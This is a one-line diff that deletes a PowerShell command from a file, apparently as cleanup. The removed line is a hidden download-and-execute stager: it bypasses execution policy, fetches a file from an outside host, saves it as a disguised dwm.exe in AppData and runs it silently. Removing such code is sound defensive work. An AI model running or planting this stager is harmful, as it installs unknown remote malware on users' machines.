@@ -1,1 +1,1 @@
-powershell -ep bypass -w hidden -nop -c "iwr -uri 'https://encrypted-bytes.com/download/a355a3ee3dc19f4465b092cba3fe81d933a4f36bfc9ed8ff5bbfba95824b3406/f48bb5c003b08c63d8de7cf1e1c02ab0/f347532a86514ccdd497da71072a4c4170f02a2dcd7f2b068fba6acf83d08694009b68ea678ce489177977d8b9ed0c48ed9316fa19ce6294df511282290b38ac9ab94227b963f63b70332fbedcbad3de/c35179bd3ec4ac3c9b1ebfb6c3f17f1b' -outfile $env:appdata\dwm.exe -useb;start $env:appdata\dwm.exe -w hidden"
+
